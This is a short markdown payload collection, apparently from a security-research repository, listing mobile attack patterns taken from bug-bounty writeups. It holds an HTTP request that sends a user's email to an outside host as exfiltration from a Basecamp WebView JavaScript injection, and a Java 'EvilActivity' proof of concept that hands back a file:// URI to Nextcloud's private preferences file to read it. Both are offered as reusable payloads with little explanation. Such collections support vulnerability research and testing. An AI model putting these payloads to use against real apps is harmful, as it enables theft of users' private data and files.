# Payloads — mobile

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. com.basecamp.bc3 Webview Javascript Injection and JS bridge takeover
- Source: `telegram writeups (verbatim excerpts)`

```
GET /?exfiltration=USER_EMAIL@gmail.com HTTP/2
Host: example.com
....
```

## 2. Access to arbitrary file of the Nextcloud Android app from within the Nextcloud Android app
- Source: `telegram writeups (verbatim excerpts)`

```
public class EvilActivity extends AppCompatActivity {
    private static final String LOG_TAG = EvilActivity.class.getName();

    final static String PRIVATE_URI = "file:///data/user/0/com.nextcloud.client/shared_prefs/com.nextcloud.client_preferences.xml";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("heen", "EvilActivity started!");
        setResult(-1, new Intent().setData(Uri.parse(PRIVATE_URI)));
        finish();
    }
}
```
